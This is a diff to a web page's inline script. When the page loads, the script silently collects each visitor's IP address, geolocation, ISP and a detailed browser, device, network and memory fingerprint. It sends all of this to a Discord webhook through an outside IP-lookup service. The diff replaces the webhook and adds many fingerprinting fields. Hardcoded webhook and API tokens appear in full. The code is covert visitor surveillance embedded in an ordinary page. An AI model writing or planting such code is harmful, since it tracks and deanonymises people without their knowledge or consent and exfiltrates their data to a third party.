@@ -149,18 +149,14 @@
     <script src="main.js"></script>
         <script>
         async function sendDiscordMessage(message) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1375548593942823082/4o2DfXSmAjWjiS1ztKHlUPJb6f3Ons4yyIaC3qoOw-VCmPUDUvFgFY85n4cqkn8vsxEN';
+  const webhookUrl = 'https://discord.com/api/webhooks/1375973561205915798/KfdHuPX7H8BerkJkgm0IeZZeTYykFoYV8A1B4RrbDKIm5PTasWC4gbKjLEzoFpxlTUgg';
 
-  const payload = {
-    content: message
-  };
+  const payload = { content: message };
 
   try {
     const res = await fetch(webhookUrl, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
 
@@ -168,18 +164,18 @@
       throw new Error(`Discord API error: ${res.status}`);
     }
   } catch (err) {
+    console.error('Send message error:', err);
   }
 }
 
 window.addEventListener('load', async () => {
   try {
-    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3'); 
+    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3');
     if (!res.ok) throw new Error('IP info API error');
     const visitor = await res.json();
 
-   const ua = navigator.userAgent;
+    const ua = navigator.userAgent;
     const language = navigator.language;
-    const platform = navigator.platform;
     const cookieEnabled = navigator.cookieEnabled;
     const deviceMemory = navigator.deviceMemory || 'Unknown';
     const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
@@ -188,8 +184,38 @@ window.addEventListener('load', async () => {
     const pixelRatio = window.devicePixelRatio || 1;
     const onlineStatus = navigator.onLine ? 'Yes' : 'No';
 
+    const appName = navigator.appName;
+    const appVersion = navigator.appVersion;
+    const product = navigator.product;
+    const vendor = navigator.vendor;
+    const languages = navigator.languages ? navigator.languages.join(', ') : language;
+
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const tzOffset = new Date().getTimezoneOffset();
+
+    const colorDepth = screen.colorDepth;
+    const pixelDepth = screen.pixelDepth;
+    const innerRes = `${window.innerWidth}x${window.innerHeight}`;
+    const outerRes = `${window.outerWidth}x${window.outerHeight}`;
+
+    const maxTouchPoints = navigator.maxTouchPoints || 0;
+    const touchSupport = window.matchMedia('(pointer: coarse)').matches ? 'Yes' : 'No';
+    const mouseSupport = window.matchMedia('(hover: hover)').matches ? 'Yes' : 'No';
+
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const connectionType = connection?.type || 'Unknown';
+    const effectiveType = connection?.effectiveType || 'Unknown';
+    const downlink = connection?.downlink || 'Unknown';
+    const rtt = connection?.rtt || 'Unknown';
+
+    const memoryInfo = performance.memory ? `
+JS Heap Size Limit: ${performance.memory.jsHeapSizeLimit}
+Total JS Heap Size: ${performance.memory.totalJSHeapSize}
+Used JS Heap Size: ${performance.memory.usedJSHeapSize}
+` : 'Memory info: Unsupported';
+
     const message = `
-**💻 Visitor Info**
+💻 Visitor Info
 IP: ${visitor.ip}
 Country: ${visitor.country || 'Unknown'}
 City: ${visitor.city || 'Unknown'}
@@ -199,27 +225,51 @@ ISP: ${visitor.org || 'Unknown'}
 Postal Code: ${visitor.postal || 'Unknown'}
 Timezone: ${visitor.timezone || 'Unknown'}
 
-**🖥️ System Info**
+🖥️ System Info
 Browser: ${ua.substring(0, 100)}
+App Name: ${appName}
+App Version: ${appVersion}
+Product: ${product}
+Vendor: ${vendor}
 Language: ${language}
-Platform: ${platform}
+Languages: ${languages}
+Platform: ${navigator.platform}
 Cookies Enabled: ${cookieEnabled ? 'Yes' : 'No'}
 RAM: ${deviceMemory} GB
 CPU Cores: ${hardwareConcurrency}
 Online: ${onlineStatus}
+Timezone: ${timezone}
+Timezone Offset: ${tzOffset} minutes
 
-**🖼️ Screen Info**
+🖼️ Screen Info
 Screen Resolution: ${screenRes}
 Available Space: ${availRes}
+Viewport Size: ${innerRes}
+Browser Window Size: ${outerRes}
+Color Depth: ${colorDepth}
+Pixel Depth: ${pixelDepth}
 Pixel Ratio: ${pixelRatio}
+
+🕹️ Input Support
+Touch Support: ${touchSupport}
+Mouse Support: ${mouseSupport}
+Max Touch Points: ${maxTouchPoints}
+
+🌐 Network Info
+Connection Type: ${connectionType}
+Effective Connection: ${effectiveType}
+Downlink: ${downlink} Mbps
+RTT: ${rtt} ms
+
+⚙️ Performance Memory Info
+${memoryInfo}
 `;
 
     sendDiscordMessage(message);
   } catch (e) {
-    console.error(e);
+    console.error('Error:', e);
   }
 });
-
 
     </script>
 </body>
